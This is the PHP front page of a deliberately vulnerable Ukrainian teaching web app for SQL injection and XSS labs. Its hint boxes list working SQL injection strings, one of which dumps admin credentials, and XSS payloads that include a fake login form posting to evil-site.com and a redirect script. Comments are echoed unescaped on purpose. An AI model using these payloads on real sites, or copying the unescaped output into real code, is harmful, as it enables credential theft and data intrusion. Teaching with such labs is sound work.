<?php
// index.php
include 'config.php';
?>

<!DOCTYPE html>
<html>
<head>
    <title>Вразливий веб-додаток - Лабораторна робота</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            margin: 0; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }
        .container { 
            width: 900px; 
            margin: 0 auto; 
            background: white; 
            padding: 30px; 
            border-radius: 10px; 
            margin-top: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        .header {
            text-align: center;
            background: linear-gradient(45deg, #ff6b6b, #feca57);
            color: white;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 30px;
        }
        .form-section {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            border-left: 4px solid #007bff;
        }
        .form-group { 
            margin-bottom: 15px; 
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #333;
        }
        input[type="text"], textarea { 
            padding: 10px; 
            width: 300px; 
            border: 2px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
        }
        input[type="text"]:focus, textarea:focus {
            border-color: #007bff;
            outline: none;
        }
        button { 
            padding: 10px 20px; 
            background: #007bff;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
        }
        button:hover {
            background: #0056b3;
        }
        .comment {
            background: white;
            border: 1px solid #ddd;
            border-radius: 6px;
            padding: 15px;
            margin: 10px 0;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .comment-header {
            background: #e9ecef;
            padding: 8px 12px;
            border-radius: 4px;
            margin-bottom: 10px;
            font-weight: bold;
        }
        .xss-demo {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            border-radius: 4px;
            padding: 15px;
            margin: 20px 0;
        }
        .danger-zone {
            background: #f8d7da;
            border: 1px solid #f5c6cb;
            border-radius: 4px;
            padding: 15px;
            margin: 10px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 Демонстраційний Вразливий Веб-Додаток</h1>
        </div>
        
        <div class="form-section">
            <h2>🔍 Пошук користувача (SQL Injection Demo)</h2>
            <form action="search.php" method="GET">
                <div class="form-group">
                    <label>Ім'я користувача для пошуку:</label>
                    <input type="text" name="username" placeholder="Введіть ім'я користувача або SQL код">
                </div>
                <button type="submit">🔍 Пошук</button>
            </form>
            <div class="xss-demo">
                <strong>💡 Підказка для SQL Injection:</strong>
                <p>Спробуйте ввести: <code>' OR '1'='1</code> або <code>' UNION SELECT NULL,NULL,NULL,NULL -- </code> або <code>' UNION SELECT id, admin_username, admin_password, admin_email FROM admin_users --</code></p>
                <p>ЗАУВАЖЕННЯ: <code>--</code>  обов'язково потрібно ставити ПРОБІЛ</p>
            </div>
        </div>
        
        <div class="form-section">
            <h2>💬 Відгуки та коментарі (XSS Demo)</h2>
            <form action="comment.php" method="POST">
                <div class="form-group">
                    <label>Ваше ім'я:</label>
                    <input type="text" name="name" placeholder="Введіть ваше ім'я">
                </div>
                <div class="form-group">
                    <label>Ваш відгук:</label>
                    <textarea name="comment" rows="4" cols="50" placeholder="Введіть ваш відгук або HTML/JS код"></textarea>
                </div>
                <button type="submit">📝 Додати відгук</button>
            </form>
            
            <div class="xss-demo">
                <strong>💡 Приклади XSS атак для тестування:</strong>
                <p><strong>Проста форма входу:</strong></p>
                <code>&lt;div style="background:white;padding:20px;border:2px solid red;"&gt;&lt;h3&gt;🔒 Термінове оновлення безпеки&lt;/h3&gt;&lt;p&gt;Будь ласка, підтвердіть ваші дані:&lt;/p&gt;&lt;form action="http://evil-site.com/steal" method="post"&gt;Логін: &lt;input type="text" name="login"&gt;&lt;br&gt;&lt;br&gt;Пароль: &lt;input type="password" name="pass"&gt;&lt;br&gt;&lt;br&gt;&lt;button&gt;Підтвердити&lt;/button&gt;&lt;/form&gt;&lt;/div&gt;</code>
                
                <p><strong>Фішинг форма з CSS:</strong></p>
                <code>&lt;style&gt;.fake-login{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:30px;border:3px solid #007bff;border-radius:10px;box-shadow:0 0 20px rgba(0,0,0,0.5);z-index:9999;}&lt;/style&gt;&lt;div class="fake-login"&gt;&lt;h2&gt;⚠️ Сесія закінчилася&lt;/h2&gt;&lt;p&gt;Увійдіть знову для продовження роботи:&lt;/p&gt;&lt;form&gt;Email: &lt;input type="email" style="width:200px;padding:8px;"&gt;&lt;br&gt;&lt;br&gt;Пароль: &lt;input type="password" style="width:200px;padding:8px;"&gt;&lt;br&gt;&lt;br&gt;&lt;button type="button" onclick="alert(`Дані відправлені на сервер зловмисника!`)"&gt;Увійти&lt;/button&gt;&lt;/form&gt;&lt;/div&gt;</code>
                
                <p><strong>Редирект з попередженням:</strong></p>
                <code>&lt;script&gt;setTimeout(function(){if(confirm(`Виявлено підозрілу активність! Перейти на безпечну сторінку?`)){window.location=`http://evil-site.com`;}}, 2000);&lt;/script&gt;&lt;div style="background:red;color:white;padding:10px;"&gt;🚨 УВАГА: Система захисту активована!&lt;/div&gt;</code>
            </div>
        </div>
        
        <div class="form-section">
            <h2>📋 Останні відгуки:</h2>
            <div class="comments">
                <?php
                // Створення таблиці коментарів якщо не існує
                $create_comments = "CREATE TABLE IF NOT EXISTS comments (
                    id INT AUTO_INCREMENT PRIMARY KEY,
                    name VARCHAR(50),
                    comment TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )";
                mysqli_query($conn, $create_comments);
                
                $query = "SELECT * FROM comments ORDER BY id DESC LIMIT 10";
                $result = mysqli_query($conn, $query);
                
                if (mysqli_num_rows($result) > 0) {
                    while ($row = mysqli_fetch_assoc($result)) {
                        echo "<div class='comment'>";
                        echo "<div class='comment-header'>";
                        echo "👤 " . htmlspecialchars($row['name']) . " написав(ла):";
                        echo "<small style='float: right; color: #666;'>" . $row['created_at'] . "</small>";
                        echo "</div>";
                        // ВРАЗЛИВІСТЬ XSS - коментар виводиться без фільтрації!
                        echo "<div class='comment-content'>" . $row['comment'] . "</div>";
                        echo "</div>";
                    }
                } else {
                    echo "<div class='comment'>";
                    echo "<p>📝 Відгуків поки немає. Будьте першим!</p>";
                    echo "</div>";
                }
                ?>
            </div>
        </div>
        
        <div class="danger-zone">
            <h3>⚠️ УВАГА - Зона небезпеки</h3>
            <p><strong>Цей веб-додаток містить навмисні вразливості для навчальних цілей!</strong></p>
            <ul>
                <li>🔓 SQL Injection в формі пошуку</li>
                <li>🔓 Cross-Site Scripting (XSS) в коментарях</li>
                <li>🔓 Відсутність валідації вхідних даних</li>
                <li>🔓 Відсутність захисту від CSRF</li>
            </ul>
            <p><em>Використовуйте тільки в ізольованому тестовому середовищі!</em></p>
        </div>
    </div>
</body>
</html>